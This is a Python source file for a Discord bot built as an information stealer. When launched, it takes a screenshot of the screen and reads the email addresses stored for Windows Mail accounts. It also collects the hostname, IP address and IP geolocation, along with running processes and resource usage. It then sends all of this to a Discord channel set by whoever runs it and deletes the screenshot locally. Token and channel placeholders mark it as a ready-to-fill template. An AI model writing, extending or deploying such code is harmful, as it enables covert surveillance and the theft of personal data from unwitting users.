import discord
import os
from PIL import ImageGrab
from datetime import datetime
import psutil
import socket
import requests
import getpass
import json
from discord.ext import commands



intents = discord.Intents.all()
client = discord.Client(intents=intents)
channel_id = CHANNEL_ID_HERE

def get_timestamp():
    now = datetime.now()
    return now.strftime("%Y-%m-%d %H:%M:%S")

def get_windows10_email_accounts():
    accounts = []
    try:
        appdata_path = os.environ['LOCALAPPDATA']
        mail_path = os.path.join(appdata_path, 'Packages', 'microsoft.windowscommunicationsapps_8wekyb3d8bbwe', 'LocalState', 'Accounts', 'Accounts.json')
        with open(mail_path, 'r') as f:
            data = json.load(f)
            for account in data['Accounts']:
                if account['Type'] == 'email':
                    accounts.append(account['EmailAddress'])
    except FileNotFoundError:
        return "No Accounts Available"
    return accounts

async def take_and_send_screenshot(channel):
   
    image = ImageGrab.grab()
   
    filename = "screenshot.png"
    image.save(filename)
    print("Screenshot saved.")
    
    pid = os.getpid()
    current_process = psutil.Process(pid)
    running_processes = psutil.process_iter(attrs=['pid', 'name'])
    app_names = set([(p.info['pid'], p.info['name']) for p in running_processes])
    half = len(app_names) // 2
    first_half = [name for _, name in list(app_names)[:half]]
    second_half = [name for _, name in list(app_names)[half:]]
    process = psutil.Process(pid)
    disk_usage = psutil.disk_usage('/')
    app_name = current_process.name()
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    url = f"http://ip-api.com/json/{ip_address}"
    response = requests.get(url)
    data = response.json()

    username = getpass.getuser()
    user = await client.fetch_user(client.user.id)
    message6 = f"`**Discord Account:** {user.name} ({user.id}`"
    message = f"`**Screenshot Time:** {get_timestamp()} \n **IP:** {ip_address} \n **APP:** {app_name} \n\n **Other Info:** \n` "
    message2 = f"`**CPU Usage:**  {process.cpu_percent()} \n **Memory Usage:** {process.memory_percent()} \n **Disk Usage:** {disk_usage.percent}% \n`"
    message5 = f"`**Email Accounts:** {get_windows10_email_accounts()}\n`"
    with open(filename, "rb") as f:
        file = discord.File(f, filename=filename)
        await channel.send(message)
        await channel.send(message5)
        await channel.send(message6)
        await channel.send(message2, file=file)
        print(f"Screenshot sent to channel: {channel.name}")
   
    os.remove(filename)
    print("Screenshot file deleted.")
    

@client.event
async def on_ready():
    
    print("Bot is ready!")
    print("Logged in as:", client.user.name, client.user.discriminator)
   
    channel = client.get_channel(channel_id)
    
    await take_and_send_screenshot(channel)
    
    await client.close()
    print("Bot session ended.")


client.run("UR_TOKEN_HERE")
